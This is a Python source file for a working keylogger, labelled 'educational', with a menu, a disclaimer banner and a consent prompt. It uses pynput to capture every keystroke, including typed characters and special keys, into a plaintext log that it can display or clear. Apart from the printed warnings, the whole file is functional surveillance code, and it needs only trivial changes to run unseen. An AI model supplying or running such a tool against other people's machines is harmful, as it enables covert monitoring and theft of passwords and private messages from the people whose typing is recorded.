
from pynput.keyboard import Listener, Key
import logging
from datetime import datetime
import os

class KeyLogger:
    def __init__(self, log_file="keylog.txt"):
        """Initialize keylogger"""
        self.log_file = log_file
        self.count = 0
        self.listener = None
        
        # Set up logging
        logging.basicConfig(
            filename=log_file,
            level=logging.DEBUG,
            format='%(asctime)s: %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
    
    def on_press(self, key):
        """Handle key press event"""
        try:
            # Regular character
            if hasattr(key, 'char'):
                char = key.char
                if char is not None:
                    logging.info(f"KEY: {char}")
                else:
                    logging.info(f"KEY: [SPECIAL KEY]")
            else:
                # Special keys (Shift, Ctrl, Enter, etc.)
                key_name = str(key).replace("Key.", "")
                
                if key == Key.enter:
                    logging.info("[ENTER]")
                elif key == Key.backspace:
                    logging.info("[BACKSPACE]")
                elif key == Key.tab:
                    logging.info("[TAB]")
                elif key == Key.space:
                    logging.info("[SPACE]")
                elif key == Key.shift:
                    logging.info("[SHIFT]")
                elif key == Key.ctrl_l or key == Key.ctrl_r:
                    logging.info("[CTRL]")
                elif key == Key.alt_l or key == Key.alt_r:
                    logging.info("[ALT]")
                elif key == Key.caps_lock:
                    logging.info("[CAPS_LOCK]")
                else:
                    logging.info(f"[{key_name.upper()}]")
            
            self.count += 1
            
            # Print progress every 20 keys
            if self.count % 20 == 0:
                print(f"✓ Logged {self.count} key events")
        
        except AttributeError:
            pass
    
    def on_release(self, key):
        """Handle key release (optional tracking)"""
        # Check for escape to stop
        if key == Key.esc:
            print("\nStopping keylogger...")
            return False
    
    def start(self):
        """Start listening to keyboard"""
        print("\n" + "="*50)
        print("KEYLOGGER STARTED")
        print(f"Log file: {self.log_file}")
        print("Press ESC to stop")
        print("="*50 + "\n")
        
        # Create listener
        self.listener = Listener(
            on_press=self.on_press,
            on_release=self.on_release
        )
        
        self.listener.start()
        self.listener.join()
    
    def stop(self):
        """Stop listening"""
        if self.listener:
            self.listener.stop()
    
    def view_logs(self):
        """Display logged keystrokes"""
        if not os.path.exists(self.log_file):
            print(f"Log file not found: {self.log_file}")
            return
        
        print(f"\n{'='*50}")
        print(f"LOGGED KEYSTROKES ({self.log_file})")
        print(f"{'='*50}\n")
        
        try:
            with open(self.log_file, 'r') as f:
                lines = f.readlines()
            
            # Show last 50 lines
            for line in lines[-50:]:
                print(line.strip())
            
            if len(lines) > 50:
                print(f"\n... ({len(lines) - 50} more entries)")
        
        except Exception as e:
            print(f"Error: {e}")
    
    def clear_logs(self):
        """Clear log file"""
        if os.path.exists(self.log_file):
            try:
                os.remove(self.log_file)
                print(f"Log file cleared")
            except Exception as e:
                print(f"Error: {e}")

def display_menu():
    """Display menu"""
    print(f"\n{'='*50}")
    print("EDUCATIONAL KEYLOGGER")
    print(f"{'='*50}")
    print("1. Start keylogger")
    print("2. View logs")
    print("3. Clear logs")
    print("4. Exit")
    print(f"{'='*50}")
    return input("Select (1-4): ")

def main():
    """Main program"""
    print(f"\n{'='*50}")
    print("EDUCATIONAL KEYLOGGER")
    print(f"{'='*50}")
    print("FOR EDUCATIONAL PURPOSES ONLY")
    print("ILLEGAL TO USE ON SYSTEMS YOU DON'T OWN")
    print("\nThis tool demonstrates:")
    print("- How keyloggers work")
    print("- Why system monitoring is important")
    print("- Keyboard event listeners in Python")
    print(f"{'='*50}\n")
    
    # Confirm user understands
    confirm = input("I understand this is for educational use only (y/n): ")
    if confirm.lower() != 'y':
        print("Exiting...")
        return
    
    logger = KeyLogger()
    
    while True:
        choice = display_menu()
        
        if choice == "1":
            logger.start()
        elif choice == "2":
            logger.view_logs()
        elif choice == "3":
            logger.clear_logs()
        elif choice == "4":
            print("Goodbye!")
            break
        else:
            print("Invalid option")

if __name__ == "__main__":
    main()